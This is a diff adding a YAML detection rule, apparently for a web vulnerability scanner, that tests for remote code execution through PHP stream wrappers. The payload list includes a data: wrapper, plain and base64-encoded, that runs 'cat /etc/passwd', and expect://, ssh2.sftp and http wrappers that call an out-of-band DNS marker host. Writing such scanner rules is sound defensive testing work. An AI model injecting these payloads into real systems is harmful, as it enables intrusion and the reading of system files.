@@ -1,0 +1,24 @@
+collect:
+ - uniq:
+   - [ URI ]
+generate:
+  - into: GET
+  - payload:
+    - 'expect://ping%20DNS_MARKER%20-c4'
+    - 'data:text/plain,<?php%20system("cat%20/etc/passwd")?>%20OR%20data:text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgL2V0Yy9wYXNzd2QiKT8+'
+    - 'ssh2.sftp://user:pass@DNS_MARKER:22/path/to/filename'
+    - 'http://DNS_MARKER'
+  - method:
+    - replace
+detect:
+  - oob:
+    - dns
+  - response:
+    - body: '(root:x:)|(/bin/bash)|(/usr/sbin/nologin)'
+meta-info:
+  - type: rce
+  - threat: 90
+  - tags:
+    - RCE
+    - php
+    - php-wrappers
